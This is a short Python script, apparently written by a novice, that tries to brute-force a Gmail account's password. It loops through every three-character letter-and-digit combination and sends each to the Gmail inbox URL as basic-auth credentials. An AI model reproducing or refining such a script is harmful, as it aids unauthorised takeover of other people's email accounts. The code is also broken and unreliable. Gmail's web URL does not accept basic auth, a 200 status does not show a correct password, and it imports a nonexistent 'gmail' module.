#all imports needed to send requests to gmail and get the response
import requests
import urllib.request
import urllib.parse
import email
import gmail
import itertools
import re
import string
from getpass import getpass
from email.mime.text import MIMEText

#asks for gmail adress and creates a loop to guess every possible combination of the password
gmail = input("Enter your gmail adress: ")
#creates a list of all possible combinations of the password
password = list(itertools.product(string.ascii_letters + string.digits, repeat=3))
#creates a loop to guess every possible combination of the password
for i in password:
    #creates a string of the combination of the password
    password = ''.join(i)
    #sends a request to the gmail adress with the combination of the password
    response = requests.get("https://mail.google.com/mail/u/0/#inbox", auth=(gmail, password))
    #if the response is 200 the password is correct and the loop is broken
    if response.status_code == 200:
        print("Password is: " + password)
        break
    #if the response is not 200 the password is not correct and the loop continues
    else:
        continue

    


